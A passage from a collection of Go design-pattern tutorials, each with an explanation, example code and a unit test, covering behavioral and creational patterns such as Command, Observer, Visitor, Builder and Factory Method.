// ConcreteHandlerA implements handler "A".
type ConcreteHandlerA struct {
  next Handler
}
// SendRequest implementation.
func (h *ConcreteHandlerA) SendRequest(message int) (result string) {
  if message == 1 {
    result = "Im handler 1"
  } else if h.next != nil {
    result = h.next.SendRequest(message)
  }
  return
}
// ConcreteHandlerB implements handler "B".
type ConcreteHandlerB struct {
  next Handler
}
// SendRequest implementation.
func (h *ConcreteHandlerB) SendRequest(message int) (result string) {
  if message == 2 {
    result = "Im handler 2"
  } else if h.next != nil {
    result = h.next.SendRequest(message)
  }
  return
}
// ConcreteHandlerC implements handler "C".
type ConcreteHandlerC struct {
  next Handler
}
// SendRequest implementation.
func (h *ConcreteHandlerC) SendRequest(message int) (result string) {
  if message == 3 {
    result = "Im handler 3"
  } else if h.next != nil {
    result = h.next.SendRequest(message)
  }
  return
}

func TestChainOfResponsibility(t *testing.T) {
  expect := "Im handler 2"
  handlers := &ConcreteHandlerA{
    next: &ConcreteHandlerB{
      next: &ConcreteHandlerC{},
    },
  }
  result := handlers.SendRequest(2)
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Command
(tags: pattern command)
---

https://github.com/AlexanderGrom/go-patterns

The Command pattern refers to object-level behavioral patterns.

The Command pattern allows you to represent a request as an object. It follows that a command is an object. Such requests, for example, can be queued, canceled, or resumed.

In this pattern, we operate with the following concepts:
Command - a request in the form of an object for execution;
Receiver - a request receiver object that will process our command;
Invoker is the requestor object.

The Command pattern decouples the object that initiates an operation from the object that knows how to perform it. The only thing the initiator needs to know is how to send the command.

Required for implementation:

1. Basic abstract class Command describing the command interface;
2. The ConcreteCommand class that implements the command;
3. The Invoker class, which implements the initiator, writes the command and provokes its execution;
4. The Receiver class, which implements the receiver and has a set of actions that the command can request;

Invoker knows how to stack commands and initiate their execution by some event. By contacting Invoker, you can cancel the command while it is not completed.

The ConcreteCommand contains the requests to the Receiver that it must execute. In turn, Receiver contains only a set of Actions that are executed when they are called from the ConcreteCommand.

package command

// Command provides a command interface.
type Command interface {
  Execute() string
}
// ToggleOnCommand implements the Command interface.
type ToggleOnCommand struct {
  receiver *Receiver
}
// Execute command.
func (c *ToggleOnCommand) Execute() string {
  return c.receiver.ToggleOn()
}
// ToggleOffCommand implements the Command interface.
type ToggleOffCommand struct {
  receiver *Receiver
}
// Execute command.
func (c *ToggleOffCommand) Execute() string {
  return c.receiver.ToggleOff()
}
// Receiver implementation.
type Receiver struct {
}
// ToggleOn implementation.
func (r *Receiver) ToggleOn() string {
  return "Toggle On"
}
// ToggleOff implementation.
func (r *Receiver) ToggleOff() string {
  return "Toggle Off"
}
// Invoker implementation.
type Invoker struct {
  commands []Command
}
// StoreCommand adds command.
func (i *Invoker) StoreCommand(command Command) {
  i.commands = append(i.commands, command)
}
// UnStoreCommand removes command.
func (i *Invoker) UnStoreCommand() {
  if len(i.commands) != 0 {
    i.commands = i.commands[:len(i.commands)-1]
  }
}
// Execute all commands.
func (i *Invoker) Execute() string {
  var result string
  for _, command := range i.commands {
    result += command.Execute() + "\n"
  }
  return result
}

func TestCommand(t *testing.T) {
  expect := "Toggle On\n" +
    "Toggle Off\n"
  invoker := &Invoker{}
  receiver := &Receiver{}
  invoker.StoreCommand(&ToggleOnCommand{receiver: receiver})
  invoker.StoreCommand(&ToggleOffCommand{receiver: receiver})
  result := invoker.Execute()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Iterator
(tags: pattern iterator)
---

https://github.com/AlexanderGrom/go-patterns

The Iterator pattern refers to object-level behavioral patterns.

The Iterator pattern provides a mechanism for traversing collections of objects without exposing their internal representation.

Often this pattern is used instead of an array of objects to not only provide access to elements, but also to provide some logic.

Iterator is a generic interface that allows you to implement arbitrary iteration logic.

Required for implementation:

1. The Iterator interface describing a set of methods for accessing the collection;
2. The ConcreteIterator class that implements the Iterator interface. Keeps track of the position of the current element while iterating over the collection (Aggregate) .;
3. Interface Aggregate describing a set of methods for a collection of objects;
4. The ConcreteAggregate class that implements the Aggregate interface and stores the elements of the collection.

package iterator

// Iterator provides a iterator interface.
type Iterator interface {
  Index() int
  Value() interface{}
  Has() bool
  Next()
  Prev()
  Reset()
  End()
}
// Aggregate provides a collection interface.
type Aggregate interface {
  Iterator() Iterator
}
// BookIterator implements the Iterator interface.
type BookIterator struct {
  shelf    *BookShelf
  index    int
  internal int
}
// Index returns current index
func (i *BookIterator) Index() int {
  return i.index
}
// Value returns current value
func (i *BookIterator) Value() interface{} {
  return i.shelf.Books[i.index]
}
// Has implementation.
func (i *BookIterator) Has() bool {
  if i.internal < 0 || i.internal >= len(i.shelf.Books) {
    return false
  }
  return true
}
// Next goes to the next item.
func (i *BookIterator) Next() {
  i.internal++
  if i.Has() {
    i.index++
  }
}
// Prev goes to the previous item.
func (i *BookIterator) Prev() {
  i.internal--
  if i.Has() {
    i.index--
  }
}
// Reset resets iterator.
func (i *BookIterator) Reset() {
  i.index = 0
  i.internal = 0
}
// End goes to the last item.
func (i *BookIterator) End() {
  i.index = len(i.shelf.Books) - 1
  i.internal = i.index
}
// BookShelf implements the Aggregate interface.
type BookShelf struct {
  Books []*Book
}
// Iterator creates and returns the iterator over the collection.
func (b *BookShelf) Iterator() Iterator {
  return &BookIterator{shelf: b}
}
// Add adds an item to the collection.
func (b *BookShelf) Add(book *Book) {
  b.Books = append(b.Books, book)
}
// Book implements a item of the collection.
type Book struct {
  Name string
}

func TestIterator(t *testing.T) {
  shelf := new(BookShelf)
  books := []string{"A", "B", "C", "D", "E", "F"}
  for _, book := range books {
    shelf.Add(&Book{Name: book})
  }
  for iterator := shelf.Iterator(); iterator.Has(); iterator.Next() {
    index, value := iterator.Index(), iterator.Value().(*Book)
    if value.Name != books[index] {
      t.Errorf("Expect Book.Name to %s, but %s", books[index], value.Name)
    }
  }
}
==================================================
Pattern Mediator
(tags: pattern mediator)
---

https://github.com/AlexanderGrom/go-patterns

The Mediator pattern refers to object-level behavioral patterns.

The Mediator pattern provides a mediation object that hides the way many other peer objects interact. Mediator makes the system loosely coupled, eliminating the need for objects to refer to each other, which allows you to change the interaction between them independently.

For example, we have an intermediary between a bakery factory, a farmer and a distribution store. The intermediary relieves the farmer from interacting with the plant, which uses his raw materials, and the plant from interacting with the store, which receives the products for sale.

Required for implementation:

1. Interface Mediator - a mediator describing the organization of the process of exchanging information between objects of the Colleague type;
2. The ConcreteMediator class that implements the Mediator interface;
3. The base abstract class Colleague is a colleague describing the organization of the process of interaction of colleague objects with an object of Mediator type;
4. The ConcreteColleague class that implements the Colleague interface. Each peer object only knows about the mediator object. All peer objects exchange information only through an intermediary.

package mediator

// Mediator provides a mediator interface.
type Mediator interface {
  Notify(msg string)
}
// Тип ConcreteMediator, реализует посредника
type ConcreteMediator struct {
  *Farmer
  *Cannery
  *Shop
}
// Notify implementation.
func (m *ConcreteMediator) Notify(msg string) {
  if msg == "Farmer: Tomato complete..." {
    m.Cannery.AddMoney(-15000.00)
    m.Farmer.AddMoney(15000.00)
    m.Cannery.MakeKetchup(m.Farmer.GetTomato())
  } else if msg == "Cannery: Ketchup complete..." {
    m.Shop.AddMoney(-30000.00)
    m.Cannery.AddMoney(30000.00)
    m.Shop.SellKetchup(m.Cannery.GetKetchup())
  }
}
// СonnectСolleagues connects all colleagues.
func СonnectСolleagues(farmer *Farmer, cannery *Cannery, shop *Shop) {
  mediator := &ConcreteMediator{
    Farmer:  farmer,
    Cannery: cannery,
    Shop:    shop,
  }
  mediator.Farmer.SetMediator(mediator)
  mediator.Cannery.SetMediator(mediator)
  mediator.Shop.SetMediator(mediator)
}
// Farmer implements a Farmer colleague
type Farmer struct {
  mediator Mediator
  tomato   int
  money    float64
}
// SetMediator sets mediator.
func (f *Farmer) SetMediator(mediator Mediator) {
  f.mediator = mediator
}
// AddMoney adds money.
func (f *Farmer) AddMoney(m float64) {
  f.money += m
}
// GrowTomato implementation.
func (f *Farmer) GrowTomato(tomato int) {
  f.tomato = tomato
  f.money -= 7500.00
  f.mediator.Notify("Farmer: Tomato complete...")
}
// GetTomato returns tomatos.
func (f *Farmer) GetTomato() int {
  return f.tomato
}
// Cannery implements a Cannery colleague.
type Cannery struct {
  mediator Mediator
  ketchup  int
  money    float64
}
// SetMediator sets mediator.
func (c *Cannery) SetMediator(mediator Mediator) {
  c.mediator = mediator
}
// AddMoney adds money.
func (c *Cannery) AddMoney(m float64) {
  c.money += m
}
// MakeKetchup implementation.
func (c *Cannery) MakeKetchup(tomato int) {
  c.ketchup = tomato
  c.mediator.Notify("Cannery: Ketchup complete...")
}
// GetKetchup returns ketchup.
func (c *Cannery) GetKetchup() int {
  return c.ketchup
}
// Shop implements a Shop colleague.
type Shop struct {
  mediator Mediator
  money    float64
}
// SetMediator sets mediator.
func (s *Shop) SetMediator(mediator Mediator) {
  s.mediator = mediator
}
// AddMoney adds money.
func (s *Shop) AddMoney(m float64) {
  s.money += m
}
// SellKetchup converts ketchup to money.
func (s *Shop) SellKetchup(ketchup int) {
  s.money = float64(ketchup) * 54.75
}
// GetMoney returns money.
func (s *Shop) GetMoney() float64 {
  return s.money
}

func TestMediator(t *testing.T) {
  farmer := new(Farmer)
  cannery := new(Cannery)
  shop := new(Shop)
  farmer.AddMoney(7500.00)
  cannery.AddMoney(15000.00)
  shop.AddMoney(30000.00)
  СonnectСolleagues(farmer, cannery, shop)
  // A farmer grows a 1000kg tomato
  // and informs the mediator about the completion of his work.
  // Next, the mediator sends the tomatoes to the cannery.
  // After the cannery produces 1000 packs of ketchup,
  // he informs the mediator about his delivery to the store.
  farmer.GrowTomato(1000)
  expect := float64(54750)
  result := shop.GetMoney()
  if result != expect {
    t.Errorf("Expect result to equal %f, but %f.\n", expect, result)
  }
}
==================================================
Pattern Memento
(tags: pattern memento)
---

https://github.com/AlexanderGrom/go-patterns

The Memento pattern refers to object-level behavioral patterns.

The Memento pattern gets and stores its internal state outside of an object so that it can be restored to the same state later. If the client later needs to "roll back" the state of the original object, it passes the Memento back to the original object to restore it.

The pattern operates on three objects:

1. The owner of the state (Originator);
2. Keeper (Memento) - Stores the state of the object-owner of the Originator class;
3. Caretaker - Responsible for the safety of the custodian object of the Memento class.

Required for implementation:

1. The Originator class, which has some kind of changing state, and also it can create and accept keepers (Memento) of its state;
2. The Memento class, implements the storage for the Originator state;
3. The Caretaker class, receives and stores a Memento object until the owner needs it.

package memento
// Originator implements a state master.
type Originator struct {
  State string
}
// CreateMemento returns state storage.
func (o *Originator) CreateMemento() *Memento {
  return &Memento{state: o.State}
}
// SetMemento sets old state.
func (o *Originator) SetMemento(memento *Memento) {
  o.State = memento.GetState()
}
// Memento implements storage for the state of Originator
type Memento struct {
  state string
}
// GetState returns state.
func (m *Memento) GetState() string {
  return m.state
}
// Caretaker keeps Memento until it is needed by Originator.
type Caretaker struct {
  Memento *Memento
}

func TestMomento(t *testing.T) {
  originator := new(Originator)
  caretaker := new(Caretaker)
  originator.State = "On"
  caretaker.Memento = originator.CreateMemento()
  originator.State = "Off"
  originator.SetMemento(caretaker.Memento)
  if originator.State != "On" {
    t.Errorf("Expect State to %s, but %s", originator.State, "On")
  }
}
==================================================
Pattern Observer
(tags: pattern observer)
---

https://github.com/AlexanderGrom/go-patterns

The Observer pattern refers to object-level behavioral patterns.

The Observer pattern defines a one-to-many dependency between objects so that when the state of one object changes, all objects that depend on it are notified and automatically updated.

The main participants in the pattern are Subject and Observer.

There are two ways to receive notifications from the publisher:

1. Pull method: After receiving a notification from the publisher, the subscriber must go to the publisher and retrieve (pull) the data himself.
2. Push method: The publisher does not notify the subscriber of data updates, but independently delivers (pushes) the data to the subscriber.

Required for implementation:

1. Abstract class Subject that defines the Publisher interface;
2. The ConcreteSubject class, implements the Subject interface;
3. An abstract class Observer that defines the general functionality of Subscribers;
4. Class ConcreteObserver, implements Subscriber;

package observer

// Publisher interface.
type Publisher interface {
  Attach(observer Observer)
  SetState(state string)
  Notify()
}
// Observer provides a subscriber interface.
type Observer interface {
  Update(state string)
}
// ConcretePublisher implements the Publisher interface.
type ConcretePublisher struct {
  observers []Observer
  state     string
}
// NewPublisher is the Publisher constructor.
func NewPublisher() Publisher {
  return &ConcretePublisher{}
}
// Attach a Observer
func (s *ConcretePublisher) Attach(observer Observer) {
  s.observers = append(s.observers, observer)
}
// SetState sets new state
func (s *ConcretePublisher) SetState(state string) {
  s.state = state
}
// Notify sends notifications to subscribers.
// Push model.
func (s *ConcretePublisher) Notify() {
  for _, observer := range s.observers {
    observer.Update(s.state)
  }
}
// ConcreteObserver implements the Observer interface.
type ConcreteObserver struct {
  state string
}
// Update set new state
func (s *ConcreteObserver) Update(state string) {
  s.state = state
}

func ExampleObserver() {
  publisher := NewPublisher()
  publisher.Attach(&ConcreteObserver{})
  publisher.Attach(&ConcreteObserver{})
  publisher.Attach(&ConcreteObserver{})
  publisher.SetState("New State...")
  publisher.Notify()
}
==================================================
Pattern State
(tags: pattern state)
---

https://github.com/AlexanderGrom/go-patterns

The State pattern refers to object-level behavioral patterns.

The State pattern allows an object to change its behavior based on internal state and is an object-oriented implementation of a state machine. The behavior of the object changes so much that it looks like the class of the object has changed.

The pattern should be applied when the behavior of an object depends on its state and it must change during program execution, provided that there are a lot of states and it is rather difficult to use conditional operators scattered throughout the code for this.

Required for implementation:

1. The Context class is an object-oriented representation of a state machine;
2. Abstract class State, which defines the interface of various states;
3. Class ConcreteStateA, implements one of the behaviors associated with a specific state;
4. The ConcreteStateB class implements one of the behaviors associated with a specific state.

package state

// MobileAlertStater provides a common interface for various states.
type MobileAlertStater interface {
  Alert() string
}
// MobileAlert implements an alert depending on its state.
type MobileAlert struct {
  state MobileAlertStater
}
// Alert returns a alert string
func (a *MobileAlert) Alert() string {
  return a.state.Alert()
}
// SetState changes state
func (a *MobileAlert) SetState(state MobileAlertStater) {
  a.state = state
}
// NewMobileAlert is the MobileAlert constructor.
func NewMobileAlert() *MobileAlert {
  return &MobileAlert{state: &MobileAlertVibration{}}
}
// MobileAlertVibration implements vibration alert
type MobileAlertVibration struct {
}
// Alert returns a alert string
func (a *MobileAlertVibration) Alert() string {
  return "Vrrr... Brrr... Vrrr..."
}
// MobileAlertSong implements beep alert
type MobileAlertSong struct {
}
// Alert returns a alert string
func (a *MobileAlertSong) Alert() string {
  return "Белые розы, Белые розы. Беззащитны шипы..."
}

func TestState(t *testing.T) {
  expect := "Vrrr... Brrr... Vrrr..." +
    "Vrrr... Brrr... Vrrr..." +
    "Белые розы, Белые розы. Беззащитны шипы..."
  mobile := NewMobileAlert()
  result := mobile.Alert()
  result += mobile.Alert()
  mobile.SetState(&MobileAlertSong{})
  result += mobile.Alert()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Strategy
(tags: pattern strategy)
---

https://github.com/AlexanderGrom/go-patterns

The Strategy pattern refers to object-level behavioral patterns.

The Strategy pattern defines a set of algorithms that are similar in nature, encapsulates them in a separate class and makes them replaceable. The Strategy pattern allows algorithms to be substituted without the involvement of clients using these algorithms.

Required for implementation:

1. The Context class, which is the context for the execution of a particular strategy;
2. Abstract class Strategy, which defines the interface of various strategies;
3. The ConcreteStrategyA class implements one of the strategies, which are algorithms aimed at achieving a specific goal;
4. The ConcreteStrategyB class implements one of the strategies, which are algorithms aimed at achieving a specific goal.

package strategy

// StrategySort provides an interface for sort algorithms.
type StrategySort interface {
  Sort([]int)
}
// BubbleSort implements bubble sort algorithm.
type BubbleSort struct {
}
// Sort sorts data.
func (s *BubbleSort) Sort(a []int) {
  size := len(a)
  if size < 2 {
    return
  }
  for i := 0; i < size; i++ {
    for j := size - 1; j >= i+1; j-- {
      if a[j] < a[j-1] {
        a[j], a[j-1] = a[j-1], a[j]
      }
    }
  }
}
// InsertionSort implements insertion sort algorithm.
type InsertionSort struct {
}
// Sort sorts data.
func (s *InsertionSort) Sort(a []int) {
  size := len(a)
  if size < 2 {
    return
  }
  for i := 1; i < size; i++ {
    var j int
    var buff = a[i]
    for j = i - 1; j >= 0; j-- {
      if a[j] < buff {
        break
      }
      a[j+1] = a[j]
    }
    a[j+1] = buff
  }
}
// Context provides a context for execution of a strategy.
type Context struct {
  strategy StrategySort
}
// Algorithm replaces strategies.
func (c *Context) Algorithm(a StrategySort) {
  c.strategy = a
}
// Sort sorts data according to the chosen strategy.
func (c *Context) Sort(s []int) {
  c.strategy.Sort(s)
}

func TestStrategy(t *testing.T) {
  data1 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}
  data2 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}
  ctx := new(Context)
  ctx.Algorithm(&BubbleSort{})
  ctx.Sort(data1)
  ctx.Algorithm(&InsertionSort{})
  ctx.Sort(data2)
  expect := "1,2,3,4,5,6,7,8,9,"
  var result1 string
  for _, val := range data1 {
    result1 += strconv.Itoa(val) + ","
  }
  if result1 != expect {
    t.Errorf("Expect result1 to equal %s, but %s.\n", expect, result1)
  }
  var result2 string
  for _, val := range data2 {
    result2 += strconv.Itoa(val) + ","
  }
  if result2 != expect {
    t.Errorf("Expect result2 to equal %s, but %s.\n", expect, result2)
  }
}
==================================================
Pattern Template Method
(tags: pattern template method)
---

https://github.com/AlexanderGrom/go-patterns

The Template Method pattern refers to class-level behavioral patterns.

The Template Method pattern forms the structure of the algorithm and allows derived classes to implement, override or override certain steps of the algorithm without changing the structure of the algorithm as a whole.

The designer decides which steps of the algorithm are immutable and which are mutable. An abstract base class implements standard immutable steps in the algorithm, and can provide a default implementation for mutable steps. Modifiable steps can be provided by the client of the component in concrete derived classes.

Required for implementation:

1. An abstract class AbstractClass that implements the Template Method, which describes the order of actions;
2. Class ConcreteClass, which implements mutable actions.

package template_method

// QuotesInterface provides an interface for setting different quotes.
type QuotesInterface interface {
  Open() string
  Close() string
}
// Quotes implements a Template Method.
type Quotes struct {
  QuotesInterface
}
// Quotes is the Template Method.
func (q *Quotes) Quotes(str string) string {
  return q.Open() + str + q.Close()
}
// NewQuotes is the Quotes constructor.
func NewQuotes(qt QuotesInterface) *Quotes {
  return &Quotes{qt}
}
// FrenchQuotes implements wrapping the string in French quotes.
type FrenchQuotes struct {
}
// Open sets opening quotes.
func (q *FrenchQuotes) Open() string {
  return "«"
}
// Close sets closing quotes.
func (q *FrenchQuotes) Close() string {
  return "»"
}
// GermanQuotes implements wrapping the string in German quotes.
type GermanQuotes struct {
}
// Open sets opening quotes.
func (q *GermanQuotes) Open() string {
  return "„"
}
// Close sets closing quotes.
func (q *GermanQuotes) Close() string {
  return "“"
}

func TestTemplateMethod(t *testing.T) {
  expect := "«Test String»"
  qt := NewQuotes(&FrenchQuotes{})
  result := qt.Quotes("Test String")
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Visitor
(tags: pattern visitor)
---

https://github.com/AlexanderGrom/go-patterns

The Visitor pattern refers to object-level behavioral patterns.

The Visitor pattern allows you to bypass a set of elements (objects) with heterogeneous interfaces, and also allows you to add a new method to an object class without changing the class of this object itself.

Required for implementation:

1. Abstract class Visitor describing the visitor interface;
2. The ConcreteVisitor class that implements a specific visitor. Implements methods to traverse a specific element;
3. The ObjectStructure class, which implements the structure (collection) in which the elements to be traversed are stored;
4. Abstract class Element, which implements the interface of structure elements;
5. The ElementA class that implements the structure element;
6. The ElementB class that implements the structure element.

package visitor

// Visitor provides a visitor interface.
type Visitor interface {
  VisitSushiBar(p *SushiBar) string
  VisitPizzeria(p *Pizzeria) string
  VisitBurgerBar(p *BurgerBar) string
}
// Place provides an interface for place that the visitor should visit.
type Place interface {
  Accept(v Visitor) string
}
// People implements the Visitor interface.
type People struct {
}
// VisitSushiBar implements visit to SushiBar.
func (v *People) VisitSushiBar(p *SushiBar) string {
  return p.BuySushi()
}
// VisitPizzeria implements visit to Pizzeria.
func (v *People) VisitPizzeria(p *Pizzeria) string {
  return p.BuyPizza()
}
// VisitBurgerBar implements visit to BurgerBar.
func (v *People) VisitBurgerBar(p *BurgerBar) string {
  return p.BuyBurger()
}
// City implements a collection of places to visit.
type City struct {
  places []Place
}
// Add appends Place to the collection.
func (c *City) Add(p Place) {
  c.places = append(c.places, p)
}
// Accept implements a visit to all places in the city.
func (c *City) Accept(v Visitor) string {
  var result string
  for _, p := range c.places {
    result += p.Accept(v)
  }
  return result
}
// SushiBar implements the Place interface.
type SushiBar struct {
}
// Accept implementation.
func (s *SushiBar) Accept(v Visitor) string {
  return v.VisitSushiBar(s)
}
// BuySushi implementation.
func (s *SushiBar) BuySushi() string {
  return "Buy sushi..."
}
// Pizzeria implements the Place interface.
type Pizzeria struct {
}
// Accept implementation.
func (p *Pizzeria) Accept(v Visitor) string {
  return v.VisitPizzeria(p)
}
// BuyPizza implementation.
func (p *Pizzeria) BuyPizza() string {
  return "Buy pizza..."
}
// BurgerBar implements the Place interface.
type BurgerBar struct {
}
// Accept implementation.
func (b *BurgerBar) Accept(v Visitor) string {
  return v.VisitBurgerBar(b)
}
// BuyBurger implementation.
func (b *BurgerBar) BuyBurger() string {
  return "Buy burger..."
}

func TestVisitor(t *testing.T) {
  expect := "Buy sushi...Buy pizza...Buy burger..."
  city := new(City)
  city.Add(&SushiBar{})
  city.Add(&Pizzeria{})
  city.Add(&BurgerBar{})
  result := city.Accept(&People{})
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Abstract Factory
(tags: pattern abstract factory)
---

https://github.com/AlexanderGrom/go-patterns

The Abstract Factory pattern refers to object-level generative patterns.

The Abstract Factory pattern provides a common interface for creating a family of related objects. This allows you to separate the functionality of the system from the internal implementation of each class, and access to these classes becomes possible through abstract interfaces.

In general, an abstract factory looks like this. For each of the families of objects, a concrete factory is created (heir to the abstract one), through which the products of this family are created.

Example: There are two soda factories, Coca-Cola and Pepsi. These factories produce a family of products (objects) - bottle, cap, label, liquid. Each of these factories produces products that interact with each other and cannot live separately from each other. The Coca-Cola Factory cannot supply empty bottles to customers.

To implement a simple creation of a family of objects, there must be an interface on which the factory operates, and the factory must also release products with a specific interface. For example, the bottles of both companies have the same interface - they have a neck through which they are filled with liquid, we can also find out the volume of the bottles. Further, the bottles may differ in shape, volume or material, this does not concern us, we only need to know where to pour the liquid, as well as how much of this liquid is needed.

Required for implementation:

1. The class of abstract factory AbstractFactory, which describes the general interface of the factory, from which each concrete factory will inherit;
2. The abstract product class AbstractProduct, which describes the general product interface from which each specific product will inherit;
3. The class of a specific factory Factory;
4. The class of a specific product ProductA.
5. The class of a specific product ProductB.

An abstract factory is a base class that describes the interface of concrete factories that create products. Concrete factory classes derived from it must implement this interface.

Also, an abstract factory should describe the abstract products that it produces, so that concrete factories would produce products with the necessary interfaces.

package abstract_factory

// AbstractFactory provides an interface for creating families of related objects.
type AbstractFactory interface {
  CreateWater(volume float64) AbstractWater
  CreateBottle(volume float64) AbstractBottle
}
// AbstractWater provides a water interface.
type AbstractWater interface {
  GetVolume() float64
}
// AbstractBottle provides a bottle interface.
type AbstractBottle interface {
  PourWater(water AbstractWater) // Bottle interacts with a water.
  GetBottleVolume() float64
  GetWaterVolume() float64
}
// CocaColaFactory implements AbstractFactory interface.
type CocaColaFactory struct {
}
// NewCocaColaFactory is the CocaColaFactory constructor.
func NewCocaColaFactory() AbstractFactory {
  return &CocaColaFactory{}
}
// CreateWater implementation.
func (f *CocaColaFactory) CreateWater(volume float64) AbstractWater {
  return &CocaColaWater{volume: volume}
}
// CreateBottle implementation.
func (f *CocaColaFactory) CreateBottle(volume float64) AbstractBottle {
  return &CocaColaBottle{volume: volume}
}
// CocaColaWater implements AbstractWater.
type CocaColaWater struct {
  volume float64 // Volume of drink.
}
// GetVolume returns volume of drink.
func (w *CocaColaWater) GetVolume() float64 {
  return w.volume
}
// CocaColaBottle implements AbstractBottle.
type CocaColaBottle struct {
  water  AbstractWater // Bottle must contain a drink.
  volume float64       // Volume of bottle.
}
// PourWater pours water into a bottle.
func (b *CocaColaBottle) PourWater(water AbstractWater) {
  b.water = water
}
// GetBottleVolume returns volume of bottle.
func (b *CocaColaBottle) GetBottleVolume() float64 {
  return b.volume
}
// GetWaterVolume returns volume of water.
func (b *CocaColaBottle) GetWaterVolume() float64 {
  return b.water.GetVolume()
}

func TestAbstractFactory(t *testing.T) {
  cocacolaFactory := NewCocaColaFactory()
  cocacolaWater := cocacolaFactory.CreateWater(2.5)
  cocacolaBottle := cocacolaFactory.CreateBottle(2.5)
  cocacolaBottle.PourWater(cocacolaWater)
  if cocacolaBottle.GetWaterVolume() != cocacolaBottle.GetBottleVolume() {
    t.Errorf("Expect volume to %.1fL, but %.1fL", cocacolaBottle.GetWaterVolume(), cocacolaBottle.GetBottleVolume())
  }
}
==================================================
Pattern Builder
(tags: pattern builder)
---

https://github.com/AlexanderGrom/go-patterns

The Builder pattern is one of the object-level generative patterns.

The Builder pattern defines a step-by-step process for building a complex product. After the last part is built, the product can be used.

In the example of the Abstract Factory pattern, the example of two factories Coca-Cola and Percy was given. Take one factory, it produces a complex product with 4 parts (cap, bottle, label, drink) that must be applied in the right order. You cannot first take the lid, bottle, screw on the lid, and then try to pour a drink there. To implement an object, a bottle of Coca-Cola that is supplied to a client, we need a Builder pattern.

It is important to understand that a complex object is not necessarily an object that operates with several other objects in the sense of OOP. For example, we need to get a document consisting of a title, introduction, content and conclusion. Our document is a complex object. We will use the Builder pattern to create a unified document compilation order.

Required for implementation:

1. Class Director, which will manage the builder and give him commands in the right order, and the builder will execute them;
2. The base abstract class Builder, which describes the interface of the builder, the commands that he must execute;
3. The ConcreteBuilder class, which implements the builder interface and interacts with a complex object;
4. The class of the complex object Product.

package builder

// Builder provides a builder interface.
type Builder interface {
  MakeHeader(str string)
  MakeBody(str string)
  MakeFooter(str string)
}
// Director implements a manager
type Director struct {
  builder Builder
}
// Construct tells the builder what to do and in what order.
func (d *Director) Construct() {
  d.builder.MakeHeader("Header")
  d.builder.MakeBody("Body")
  d.builder.MakeFooter("Footer")
}
// ConcreteBuilder implements Builder interface.
type ConcreteBuilder struct {
  product *Product
}
// MakeHeader builds a header of document..
func (b *ConcreteBuilder) MakeHeader(str string) {
  b.product.Content += "<header>" + str + "</header>"
}
// MakeBody builds a body of document.
func (b *ConcreteBuilder) MakeBody(str string) {
  b.product.Content += "<article>" + str + "</article>"
}
// MakeFooter builds a footer of document.
func (b *ConcreteBuilder) MakeFooter(str string) {
  b.product.Content += "<footer>" + str + "</footer>"
}
// Product implementation.
type Product struct {
  Content string
}
// Show returns product.
func (p *Product) Show() string {
  return p.Content
}

func TestBuilder(t *testing.T) {
  expect := "<header>Header</header>" +
    "<article>Body</article>" +
    "<footer>Footer</footer>"
  product := new(Product)
  director := Director{&ConcreteBuilder{product}}
  director.Construct()
  result := product.Show()
  if result != expect {
    t.Errorf("Expect result to %s, but %s", result, expect)
  }
}
==================================================
Pattern Factory Method
(tags: pattern factory method)
---

https://github.com/AlexanderGrom/go-patterns

The Factory Method pattern refers to class-level generative patterns and focuses only on relationships between classes.

The Factory Method pattern is useful when the system must remain easily extensible by adding new types of objects. This pattern is the basis for all generative patterns and can be easily transformed to suit the needs of the system. Therefore, if the developer is faced with unclear requirements for the product or the way of organizing interaction between products is not clear, then first you can use the Factory Method pattern until all the requirements are fully formed.

The Factory Method pattern is used to create objects with a specific interface, which are provided by descendants. In other words, there is a base abstract factory class that says that each inheriting factory must implement such and such a method to create its products.

The implementation of the factory method can be different, in most cases it depends on the implementation language. It can be polymorphism or a parameterized method.

Example: We receive files of three extensions .txt, .png, .doc. Depending on the file extension, we have to save it in one of the directories / file / txt /, / file / png / and / file / doc /. This means that we will have a file factory with a parameterized factory method that accepts the path to a file that we need to store in one of the directories. This factory method returns an object to us, using which we can manipulate our file (save, see the type and directory for saving). Note that we do not specify in any way which instance of the product object we need to get, this is done by the factory method by determining the file extension and, based on it, choosing the appropriate product class. Thus, if our system expands and the available file extensions become, for example, 25, then we just need to change the factory method and implement the product classes.

Required for implementation:

1. The basic abstract class Creator, which describes the interface that a specific factory must implement to produce products. This base class describes a factory method.
2. The base Product class, which describes the product interface returned by the factory. All products returned by the factory must adhere to the same interface.
3. The class of a specific factory for the production of ConcreteCreator products. This class must implement a factory method;
4. Class of the real product ConcreteProductA;
5. The class of the real product ConcreteProductB;
6. The class of the real product ConcreteProductC.

Factory Method differs from Abstract Factory in that Abstract Factory produces a family of objects, these objects are different, have different interfaces, but interact with each other. While Factory Method produces products that adhere to the same interface and these products are not interconnected, they do not interact.

package factory_method

import "log"

// Creater provides a factory interface.
type Creater interface {
  CreateProduct(action string) Producter // Factory Method
}
// Producter provides a product interface.
// All products returned by factory must provide a single interface.
type Producter interface {
  Use() string // Every product should be can be used
}
// ConcreteCreater implements Creater interface.
type ConcreteCreater struct {
}
// NewCreater is the ConcreteCreater constructor.
func NewCreater() Creater {
  return &ConcreteCreater{}
}
// CreateProduct is a Factory Method
func (p *ConcreteCreater) CreateProduct(action string) Producter {
  var product Producter
  switch action {
  case "A":
    product = &ConcreteProductA{action}
  case "B":
    product = &ConcreteProductB{action}
  case "C":
    product = &ConcreteProductC{action}
  default:
    log.Fatalln("Unknown Action")
  }
  return product
}
// ConcreteProductA implements product "A"
type ConcreteProductA struct {
  action string
}
// Use returns product action
func (p *ConcreteProductA) Use() string {
  return p.action
}
// ConcreteProductB implements product "B"
type ConcreteProductB struct {
  action string
}
// Use returns product action
func (p *ConcreteProductB) Use() string {
  return p.action
}
// ConcreteProductC implements product "C"
type ConcreteProductC struct {
  action string
}
// Use returns product action
func (p *ConcreteProductC) Use() string {
  return p.action
}

func TestFactoryMethod(t *testing.T) {
  assert := []string{"A", "B", "C"}
  factory := NewCreater()
